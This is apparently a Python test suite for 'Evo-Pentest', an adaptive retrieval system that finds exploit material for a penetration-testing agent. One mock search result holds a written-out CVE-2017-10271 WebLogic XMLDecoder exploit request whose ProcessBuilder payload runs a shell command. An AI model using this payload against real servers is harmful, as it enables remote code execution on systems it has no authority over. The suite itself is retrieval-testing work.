"""
Evo-Pentest Step 3 完整测试套件
测试自适应查询自反思系统的所有组件
"""

import logging
from pathlib import Path
from typing import List

from processors.failure_detector import FailureDetector, RetrievalResult
from processors.reflection_diagnoser import ReflectionDiagnoser
from processors.query_rewriter import QueryRewriter
from processors.adaptive_retriever import AdaptiveRetriever, UtilityScorer

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("Test.Step3")


def create_mock_results(scenario: str) -> List[RetrievalResult]:
    """
    创建不同场景的模拟检索结果
    """
    scenarios = {
        'excellent': [
            RetrievalResult(
                title="CVE-2017-10271 WebLogic RCE Complete Exploit",
                content="""
                This exploit leverages XMLDecoder deserialization vulnerability in WebLogic.
                
                Exploit Code:
                POST /wls-wsat/CoordinatorPortType HTTP/1.1
                Content-Type: text/xml
                
                <soapenv:Envelope>
                  <soapenv:Body>
                    <java><void class="java.lang.ProcessBuilder">
                      <array class="java.lang.String" length="3">
                        <void index="0"><string>/bin/bash</string></void>
                        <void index="1"><string>-c</string></void>
                        <void index="2"><string>calc.exe</string></void>
                      </array>
                      <void method="start"/></void>
                  </soapenv:Body>
                </soapenv:Envelope>
                
                Successfully tested on WebLogic 10.3.6.0, 12.1.3, 12.2.1.
                """,
                score=0.98,
                source="exploit-db"
            ),
            RetrievalResult(
                title="WebLogic T3 Protocol Deserialization Analysis",
                content="Detailed technical breakdown of T3 protocol vulnerabilities with working POC code...",
                score=0.92,
                source="github"
            ),
            RetrievalResult(
                title="WebLogic Security Patches for CVE-2017-10271",
                content="Oracle security advisory with patch analysis and workarounds...",
                score=0.85,
                source="oracle"
            )
        ],
        
        'poor_quality': [
            RetrievalResult(
                title="WebLogic Overview",
                content="WebLogic is a middleware...",
                score=0.35,
                source="wiki"
            ),
            RetrievalResult(
                title="General Security Best Practices",
                content="Always update software...",
                score=0.28,
                source="blog"
            )
        ],
        
        'mixed_quality': [
            RetrievalResult(
                title="CVE-2017-10271 Technical Report",
                content="This vulnerability affects WebLogic through XMLDecoder. Detailed analysis with mitigation strategies...",
                score=0.75,
                source="nist"
            ),
            RetrievalResult(
                title="WebLogic Setup Guide",
                content="How to install and configure WebLogic Server...",
                score=0.42,
                source="docs"
            ),
            RetrievalResult(
                title="XML Deserialization Attacks Overview",
                content="General overview of deserialization vulnerabilities across platforms...",
                score=0.55,
                source="research"
            )
        ],
        
        'empty': []
    }
    
    return scenarios.get(scenario, scenarios['mixed_quality'])


def test_failure_detector():
    """测试失败检测器"""
    logger.info("\n" + "=" * 80)
    logger.info("TEST 1: Failure Detector")
    logger.info("=" * 80)
    
    detector = FailureDetector(top_k=5, min_useful_docs=2)
    
    # 测试场景1: 优秀结果 -> 不应失败
    logger.info("\n[Scenario 1] Excellent Results")
    results_excellent = create_mock_results('excellent')
    analysis1 = detector.detect(
        query="WebLogic CVE-2017-10271 exploit payload",
        results=results_excellent,
       target_info="WebLogic 10.3.6.0"
    )
    logger.info(analysis1)
    assert not analysis1.is_failed, "Should not fail for excellent results"
    logger.info("✓ PASS: Correctly identified successful retrieval")
    
    # 测试场景2: 低质量结果 -> 应该失败
    logger.info("\n[Scenario 2] Poor Quality Results")
    results_poor = create_mock_results('poor_quality')
    analysis2 = detector.detect(
        query="WebLogic CVE-2017-10271 exploit payload",
        results=results_poor
    )
    logger.info(analysis2)
    assert analysis2.is_failed, "Should fail for poor results"
    logger.info("✓ PASS: Correctly detected failed retrieval")
    
    # 测试场景3: 空结果 -> 应该失败
    logger.info("\n[Scenario 3] Empty Results")
    results_empty = create_mock_results('empty')
    analysis3 = detector.detect(
        query="NonExistentCVE-9999-99999",
        results=results_empty
    )
    logger.info(analysis3)
    assert analysis3.is_failed and analysis3.confidence == 1.0, "Should fail with high confidence for empty results"
    logger.info("✓ PASS: Correctly handled empty results")


def test_reflection_diagnoser():
    """测试反思诊断器"""
    logger.info("\n" + "=" * 80)
    logger.info("TEST 2: Reflection Diagnoser")
    logger.info("=" * 80)
    
    diagnoser = ReflectionDiagnoser()
    detector = FailureDetector()
    
    # 测试场景1: CVE查询漂移
    logger.info("\n[Scenario 1] CVE Query Drift")
    query1 = "CVE-2017-10271 exploit"
    results1 = create_mock_results('poor_quality')
    failure1 = detector.detect(query1, results1)
    
    diagnoses1 = diagnoser.diagnose(query1, failure1, results1, "WebLogic 10.3.6.0")
    logger.info(f"Found {len(diagnoses1)} diagnoses:")
    for d in diagnoses1:
        logger.info(f"\n{d}")
    
    assert len(diagnoses1) > 0, "Should detect query drift"
    logger.info("✓ PASS: Detected query issues")
    
    # 测试场景2: 过于泛化
    logger.info("\n[Scenario 2] Overly General Query")
    query2 = "WebLogic vulnerability"
    results2 = create_mock_results('mixed_quality')
    failure2 = detector.detect(query2, results2)
    
    diagnoses2 = diagnoser.diagnose(query2, failure2, results2)
    logger.info(f"Found {len(diagnoses2)} diagnoses:")
    for d in diagnoses2:
        logger.info(f"\n{d}")
    
    logger.info("✓ PASS: Provided diagnostic insights")


def test_query_rewriter():
    """测试查询改写器"""
    logger.info("\n" + "=" * 80)
    logger.info("TEST 3: Query Rewriter")
    logger.info("=" * 80)
    
    rewriter = QueryRewriter()
    diagnoser = ReflectionDiagnoser()
    detector = FailureDetector()
    
    # 测试场景1: 基于诊断改写
    logger.info("\n[Scenario 1] Diagnosis-Based Rewriting")
    query1 = "CVE-2017-10271"
    results1 = create_mock_results('poor_quality')
    failure1 = detector.detect(query1, results1)
    diagnoses1 = diagnoser.diagnose(query1, failure1, results1, "WebLogic 10.3.6.0")
    
    rewrites1 = rewriter.rewrite(query1, diagnoses1, "WebLogic 10.3.6.0", num_variants=3)
    logger.info(f"Generated {len(rewrites1)} variants:")
    for i, rw in enumerate(rewrites1, 1):
        logger.info(f"\nVariant {i}:")
        logger.info(f"  Query: {rw.query}")
        logger.info(f"  Strategy: {rw.strategy.value}")
        logger.info(f"  Rationale: {rw.rationale}")
    
    assert len(rewrites1) == 3, "Should generate 3 variants"
    assert all(rw.query != query1 for rw in rewrites1), "Variants should differ from original"
    logger.info("✓ PASS: Generated diverse query variants")
    
    # 测试场景2: 默认策略改写
    logger.info("\n[Scenario 2] Default Strategy")
    query2 = "WebLogic deserialization"
    rewrites2 = rewriter.rewrite(query2, [], "", num_variants=3)
    logger.info(f"Generated {len(rewrites2)} default variants:")
    for i, rw in enumerate(rewrites2, 1):
        logger.info(f"  {i}. {rw.query} ({rw.strategy.value})")
    
    logger.info("✓ PASS: Default rewriting works")


def test_adaptive_retriever():
    """测试真实的自适应检索器集成"""
    logger.info("\n" + "=" * 80)
    logger.info("TEST 4: Real Adaptive Retriever Integration")
    logger.info("=" * 80)
    
    from processors.ragflow_client import RAGFlowClient
    from processors.evo_config import config
    
    ragflow_client = RAGFlowClient(config.RAGFLOW_API_KEY, config.RAGFLOW_BASE_URL)
    
    def real_kb_search(query: str) -> List[RetrievalResult]:
        logger.info(f"  [RAGFlow KB] Searching: {query}")
        response = ragflow_client.search(
            query=query,
            dataset_id=config.RAGFLOW_DATASET_ID,
            top_k=10
        )
        
        results = []
        chunks = response.get('data', {}).get('chunks', [])
        for item in chunks:
            results.append(RetrievalResult(
                title=item.get('document_name', 'Unknown'),
                content=item.get('content_with_weight', item.get('content', '')),
                score=item.get('similarity', 0.0),
                source='ragflow'
            ))
        return results
    
    # 创建自适应检索器
    retriever = AdaptiveRetriever(
        knowledge_base_search_func=real_kb_search,
        utility_scorer=UtilityScorer(model_path=config.UTILITY_MODEL_PATH if config.UTILITY_MODEL_PATH.exists() else None),
        max_iterations=3,
        top_k=5
    )
    
    # 执行检索
    test_query = "CVE-2017-10271 exploit"
    logger.info(f"\n[Test Query] {test_query}")
    result = retriever.retrieve(
        query=test_query,
        target_info="WebLogic 10.3.6.0"
    )
    
    # 如果检索成功，推送经验到经验库
    if result.success:
        logger.info(f"\n📝 推送经验到经验库: {config.RAGFLOW_EXPR_ID}")
        experience = retriever.summarize_experience(test_query, result)
        ragflow_client.push_structured_summary(
            dataset_id=config.RAGFLOW_EXPR_ID,
            title=f"Pentest Test Exp: {test_query}",
            content=experience
        )
    
    # 验证结果
    logger.info("\n" + "=" * 80)
    logger.info("ADAPTIVE RETRIEVAL RESULTS")
    logger.info("=" * 80)
    logger.info(f"Success: {result.success}")
    logger.info(f"Total Iterations: {result.total_iterations}")
    logger.info(f"Final Query: {result.final_query}")
    logger.info(f"\nRetrieval History:")
    for step in result.retrieval_history:
        logger.info(f"\n  Iteration {step.iteration}:")
        logger.info(f"    Query: {step.query}")
        logger.info(f"    Results: {step.num_results}")
        logger.info(f"    Failed: {step.failure_detected}")
        if step.diagnoses:
            logger.info(f"    Diagnoses: {', '.join(step.diagnoses)}")
        if step.rewritten_queries:
            logger.info(f"    Rewrites: {len(step.rewritten_queries)} variants")
    
    logger.info(f"\nTop 3 Final Results:")
    for i, r in enumerate(result.reranked_results[:3], 1):
        logger.info(f"\n  {i}. {r.title} (score={r.score:.3f})")
        logger.info(f"     {r.content[:150]}...")
    
    # 保存日志
    log_path = Path("attack_kb/logs/test_adaptive_retrieval.json")
    retriever.save_retrieval_log(result, log_path)
    logger.info(f"\n✓ PASS: Adaptive retrieval completed")
    logger.info(f"  Log saved to: {log_path}")


def test_utility_scorer_integration():
    """测试Utility Scorer集成"""
    logger.info("\n" + "=" * 80)
    logger.info("TEST 5: Utility Scorer Integration(Model Loading)")
    logger.info("=" * 80)
    
    # 尝试加载已训练的模型
    model_path = Path("attack_kb/models/best_model")
    
    if not model_path.exists():
        logger.warning(f"Model not found at {model_path}, skipping reranking test")
        logger.info("To test with trained model:")
        logger.info("  1. Run: python -m processors.train_balanced")
        logger.info("  2. Re-run this test")
        return
    
    scorer = UtilityScorer(model_path=model_path, device='cpu')
    
    # 测试重排序
    query = "WebLogic CVE-2017-10271 exploit payload"
    results = create_mock_results('mixed_quality')
    
    logger.info(f"\nOriginal ranking:")
    for i, r in enumerate(results, 1):
        logger.info(f"  {i}. {r.title} (score={r.score:.3f})")
    
    reranked = scorer.rerank(query, results)
    
    logger.info(f"\nAfter reranking:")
    for i, r in enumerate(reranked, 1):
        logger.info(f"  {i}. {r.title} (new_score={r.score:.3f})")
    
    logger.info("\n✓ PASS: Utility scorer successfully reranked results")


def run_all_tests():
    """运行所有测试"""
    logger.info("\n" + "#" * 80)
    logger.info("EVO-PENTEST STEP 3: COMPREHENSIVE TEST SUITE")
    logger.info("System 2 Reflection - Active Query Self-Correction")
    logger.info("#" * 80)
    
    try:
        test_failure_detector()
        test_reflection_diagnoser()
        test_query_rewriter()
        test_adaptive_retriever()
        test_utility_scorer_integration()
        
        logger.info("\n" + "#" * 80)
        logger.info("✓ ALL TESTS PASSED")
        logger.info("#" * 80)
        logger.info("\nStep 3 Implementation Complete!")
        logger.info("\nKey Features:")
        logger.info("  ✓ Multi-dimensional failure detection")
        logger.info("  ✓ Reflective diagnosis (6 diagnosis types)")
        logger.info("  ✓ Exploration-exploitation balanced rewriting")
        logger.info("  ✓ Utility-driven document reranking")
        logger.info("  ✓ Iterative adaptive retrieval (max 3 iterations)")
        logger.info("\nReady for integration into penetration testing agent!")
        
    except AssertionError as e:
        logger.error(f"\n✗ TEST FAILED: {e}")
        raise
    except Exception as e:
        logger.error(f"\n✗ UNEXPECTED ERROR: {e}")
        raise


if __name__ == "__main__":
    run_all_tests()
